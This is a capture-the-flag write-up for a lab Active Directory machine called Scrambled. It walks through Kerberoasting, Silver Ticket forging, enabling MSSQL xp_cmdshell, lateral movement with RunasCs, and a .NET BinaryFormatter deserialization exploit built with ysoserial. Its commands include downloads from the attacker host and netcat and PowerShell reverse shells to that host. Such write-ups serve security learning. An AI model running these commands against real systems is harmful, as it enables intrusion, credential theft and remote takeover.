+++
date = '2026-07-31T03:26:15+02:00'
draft = false
title = 'Scrambled Writeup EN'
+++
**Author**: **`joy.scd01`**

**Date**: **`14/04/2025`**

![Scrambled.jpeg](/images/imgs_scrambled/Scrambled.jpeg)

---
# Introduction

**_Scrambled_** is officially rated as a **Medium-level Active Directory** environment, but its complexity and exploitation path heavily blur the line into **Hard** territory. The environment is heavily fortified by completely disabling **NTLM authentication**, forcing a **Kerberos-Only** approach.

The initial foothold is gained by enumerating web pages to leak a valid username, guessing its password, and discovering the **Kerberos** restriction via internal **IT** documents on an **SMB share**. From there, the path requires performing a **Kerberoasting attack** against an **MSSQL** service account, utilizing the cracked credentials to forge a **Silver Ticket**, and accessing the database as a highly privileged user. 
After dumping cleartext credentials from the database and gaining a reverse shell via **`xp_cmdshell`**, Lateral Movement is achieved using **RunasCs**. Finally, Privilege Escalation involves reverse engineering a custom **`.NET`** **Thick Client**, pivoting the network traffic through a **Windows Commando VM**, and exploiting an **Insecure Deserialization** vulnerability to gain an **`NT AUTHORITY\SYSTEM`** shell.

---
# Techniques Used

- **Kerberoasting**
- **Silver Ticket Attack**
- **MSSQL Enumeration & `xp_cmdshell` Execution**
- **Lateral Movement via RunasCs**
- **Network Pivoting & Traffic Routing**
- **Thick Client Reverse Engineering (.NET)**
- **Insecure Deserialization (.NET BinaryFormatter)**

---
# Enumeration

## nmap

Initial full port scan:

```bash
nmap -p- scrambled -Pn
```

```text
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
4411/tcp  open  unknown
5985/tcp  open  wsman
9389/tcp  open  adws
```

Targeted scan with scripts and service detection:

```bash
nmap -sC -sV scrambled -Pn
```

```text
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Scramble Corp Intranet
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-07-30 16:01:27Z)
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: scrm.local, Site: Default-First-Site-Name)
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
4411/tcp open  unknown
```

I added **`scrm.local`** and **`dc1.scrm.local`** to my **`/etc/hosts`** file.

## Web Enumeration

Browsing the web server on port **80**, I found an "**`IT Services`**" page mentioning a password reset system. It stated that users could contact IT to have their password temporarily reset to match their username.

![pass_rst.png](/images/imgs_scrambled/pass_rst.png)

On the "**`Contacting IT Support`**" page, I leaked a valid username: **`ksimpson`**.

![it_supp.png](/images/imgs_scrambled/it_supp.png)

Based on the password reset policy mentioned earlier, I tested with **NetExec**, guessing that the password was the same as the username:

```bash
nxc smb 10.129.49.94 -u ksimpson -p ksimpson --shares -k
```

![smb.png](/images/imgs_scrambled/smb.png)

I got a hit.

---
# Initial Access | Kerberoasting & Silver Ticket Attack

I connected to the shares using **impacket-smbclient** (standard **smbclient** was throwing errors) and downloaded a file named **`Network Security Changes.pdf`** from the **`Public`** share:

```bash
impacket-smbclient scrm.local/ksimpson:ksimpson@DC1.scrm.local -k
```

![smbshare.png](/images/imgs_scrambled/smbshare.png)

The **PDF** contained crucial information:

- **NTLM** authentication was disabled across the entire network to prevent **relaying attacks**. Only **Kerberos** was allowed.

- The HR department's **SQL service** had its access restricted.

With a valid user and **NTLM** disabled, my mind immediately went to a **Kerberoasting** attack. However, I wanted to map out the domain users before. 

I used **NetExec** to perform a **RID brute-force** attack via **Kerberos**:

```bash
nxc smb 10.129.49.94 -u ksimpson -p ksimpson --rid-brute -k
```

![ridbrute.png](/images/imgs_scrambled/ridbrute.png)

One specific account caught my eye: **`sqlsvc`**. This perfectly aligned with the IT document mentioning the restricted **HR SQL database**.

I proceeded to request the **SPNs** for the domain:

```bash
GetUserSPNs.py scrm.local/ksimpson:"ksimpson" -dc-host dc1.scrm.local -k -request
```

![kerberoast.png](/images/imgs_scrambled/kerberoast.png)

I successfully retrieved the **TGS** for the **`sqlsvc`** account (associated with the **MSSQLSvc SPN**). I cracked it using **John The Ripper**:

```bash
john krb5tgs_sqlsvc --format=krb5tgs --wordlist=/usr/share/wordlists/rockyou.txt
```

![john.png](/images/imgs_scrambled/john.png)

Since I needed to interact with the **MSSQL service** directly, I decided to forge a **Silver Ticket**.
First, I generated a local **`krb5.conf`** file using **nxc**:

```bash
nxc smb dc1.scrm.local --generate-krb5-file scrm.krb5
export KRB5_CONFIG=scrm.krb5
sudo cp scrm.krb5 /etc/krb5.conf
```

![krb5conf.png](/images/imgs_scrambled/krb5conf.png)

**Note**: _This step isn't strictly necessary, but it is my personal best practice to let my attacking machine correctly map the **Kerberos** realm. It prevents annoying **DNS** resolution problems, which are a common pitfall in **Kerberos-only** environments._

Next, I requested a **TGT** for **`sqlsvc`**, exported the cache, and retrieved the domain **SID**:

```bash
impacket-getTGT scrm.local/"sqlsvc:Pegasus60"
export KRB5CCNAME=sqlsvc.ccache
impacket-lookupsid scrm.local/sqlsvc@dc1.scrm.local -k
```

![silverticket1.png](/images/imgs_scrambled/silverticket1.png)

I converted the password **`Pegasus60`** to its **NTLM hash** via an online generator

![silverticket2.png](/images/imgs_scrambled/silverticket2.png)

And forged the **Silver Ticket** impersonating the **Administrator** user:

```bash
impacket-ticketer -nthash B999A16500B87D17EC7F2E2A68778F05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain scrm.local -spn "MSSQL/SCRM.LOCAL:1433@SCRM.LOCAL" -user-id 500 Administrator
export KRB5CCNAME=Administrator.ccache
```

![silverticket3.png](/images/imgs_scrambled/silverticket3.png)

Using the forged ticket, I authenticated to the database via **Kerberos** and successfully grabbed the **user flag**:

```bash
impacket-mssqlclient -k -no-pass scrm.local -windows-auth
```
```sql
SELECT * FROM OPENROWSET(BULK N'C:\Users\MiscSvc\Desktop\user.txt', SINGLE_CLOB) AS Contents;
```

![userf.png](/images/imgs_scrambled/userf.png)

---
# Lateral Movement | xp_cmdshell & RunasCs.exe

Enumerating the databases (**`ScrambleHR`**), I dumped the **`UserImport`** table:

```sql
SELECT name FROM sys.databases;
SELECT TABLE_NAME FROM ScrambleHR.INFORMATION_SCHEMA.TABLES;
SELECT * FROM ScrambleHR.dbo.UserImport
```

![pass.png](/images/imgs_scrambled/pass.png)

I verified if **WinRM** access was allowed for **`MiscSvc`**, but it wasn't. 

![noremote.png](/images/imgs_scrambled/noremote.png)

To gain an interactive shell, I enabled **`xp_cmdshell`** on the **MSSQL** instance:

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

I fired up a **Netcat** listener and executed a **Base64** encoded **PowerShell** reverse shell:

```sql
EXEC xp_cmdshell 'powershell -exec bypass -enc JABjAGwAaQBlAG...[REDACTED]...OAGUAKQA=';
```

![initial_access.png](/images/imgs_scrambled/initial_access.png)

I landed a shell as the **`sqlsvc`** user. To horizontally escalate to the **`MiscSvc`** account, I transferred **`nc.exe`** and **`RunasCs.exe`**:

```powershell
iwr -uri [http://10.10.16.77:8000/runascs.exe](http://10.10.16.77:8000/runascs.exe) -Outfile runascs.exe
iwr -uri [http://10.10.16.77:8000/nc64.exe](http://10.10.16.77:8000/nc64.exe) -Outfile nc.exe
```

I used **RunasCs** to spawn a new **Netcat** reverse shell using the newly found credentials:

```powershell
C:\Windows\Temp\runascs.exe MiscSvc ScrambledEggs9900 "C:\Windows\Temp\nc.exe -e cmd.exe 10.10.16.77 22666"
```

![lateral.png](/images/imgs_scrambled/lateral.png)

I was now logged in as **`MiscSvc`**.

---
# Privilege Escalation | Thick Client & .NET Deserialization

Enumerating the file system, I discovered a custom application in **`C:\Shares\IT\Apps\Sales Order Client`**. 

![dotexe0.png](/images/imgs_scrambled/dotexe0.png)

I downloaded both the executable (**`ScrambleClient.exe`**) and its **DLL** using **impacket-smbclient**.

![dotexe.png](/images/imgs_scrambled/dotexe.png)

Using **ILSpy** to decompile the **DLL**, I found a hardcoded authentication bypass: submitting the username **`scrmdev`** with a **blank password** bypassed the login prompt.

![bypass.png](/images/imgs_scrambled/bypass.png)

## Commando VM & Advanced Network Pivoting

**Note**: _Honestly, here is where things start to get seriously complicated._

At this point, interacting with a **Windows-based Thick Client** via **Linux** is extremely tricky. I decided to switch to my **Windows Commando VM**.

To allow the **Commando VM** to communicate directly with the **Active Directory** environment through my **Kali VPN** connection, I transformed my **Kali** machine into a router:

```bash
# On Kali: Enable IP Forwarding and Masquerade traffic
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o tun0 -j MASQUERADE
```

Then, on the **Commando VM** (set to **NAT network**), I added the static routes pointing to my **Kali** machine's **IP**, and mapped **`dc1.scrm.local`** in the hosts file (**`C:\Windows\System32\drivers\etc\hosts`**).

```powershell
route add 10.129.0.0 mask 255.255.0.0 <KALI_IP>
route add 10.10.0.0 mask 255.255.0.0 <KALI_IP>
```

I ran **`ScrambleClient.exe`**

![client.jpeg](/images/imgs_scrambled/client.jpeg)

bypassed the login using **`scrmdev`**, and enabled **debug logging** in the software options.

![logged.jpeg](/images/imgs_scrambled/logged.jpeg)

Upon trying to upload an order, a file named **`ScrambleDebugLog.txt`** was generated.

![deserialization.jpeg](/images/imgs_scrambled/deserialization.jpeg)

The log revealed that the application communicates with port **4411** by sending the command **`UPLOAD_ORDER;`** followed by a **Base64** encoded payload serialized via the **`.NET BinaryFormatter`** class.

**Note**: _This is a textbook **Insecure Deserialization** vulnerability. The application utilizes the **`BinaryFormatter`** class to reconstruct the object from the data stream without any prior validation. This allows us to inject a malicious serialized payload that, once instantiated by the server, leads to arbitrary code execution._ 

I used **`ysoserial.exe`** on my **Commando VM** to craft a malicious payload using the **`WindowsIdentity`** gadget:

```powershell
ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Windows\Temp\nc.exe -e powershell 10.10.16.77 22667"
```

![ysoserial.jpeg](/images/imgs_scrambled/ysoserial.jpeg)

Finally, I connected to the application's listening port via **telnet** and sent the payload:

```powershell
telnet dc1.scrm.local 4411
UPLOAD_ORDER;<BASE64_PAYLOAD>
```

![privesc.jpeg](/images/imgs_scrambled/privesc.jpeg)

The deserialization executed the reverse shell, granting me access as **`NT AUTHORITY\SYSTEM`**.

![rootf.png](/images/imgs_scrambled/rootf.png)

I retrieved the **root flag** from **`C:\Users\Administrator\Desktop\root.txt`**.

---
# Final Thoughts

**_Scrambled_** is an absolutely incredible machine. Despite its official **Medium** rating, the complexity of the exploitation path easily pushes this machine into **Hard** territory. I would easily put it on par with **_Vintage_** in terms of overall difficulty and required technical breadth.

The initial **Kerberos-only** restriction forces you out of standard **AD** methodologies, demanding a solid understanding of how **Kerberos** tickets are structured and forged (**Silver Tickets**). However, the real challenge lies in the final Privilege Escalation phase. Reversing a **`.NET Thick Client`** is one thing, but configuring a clean **network pivot** to route traffic from a **Windows Analysis VM** through **Kali** to interact with an **Active Directory** lab environment requires a deep, practical understanding of networking and routing protocols.
Exploiting the **`BinaryFormatter`** insecure deserialization via a custom socket communication on port **4411** was the perfect conclusion to this grueling, but highly rewarding box.

**Sources**:

- **Kerberos Silver Ticket Attack | https://www.youtube.com/watch?v=KngApymmV60**

- **Abusing MSSQL (xp_cmdshell) | https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html**

- **RunasCs.exe | https://github.com/antonioCoco/RunasCs**

- **.NET Insecure Deserialization (ysoserial.net) | https://github.com/pwntester/ysoserial.net**

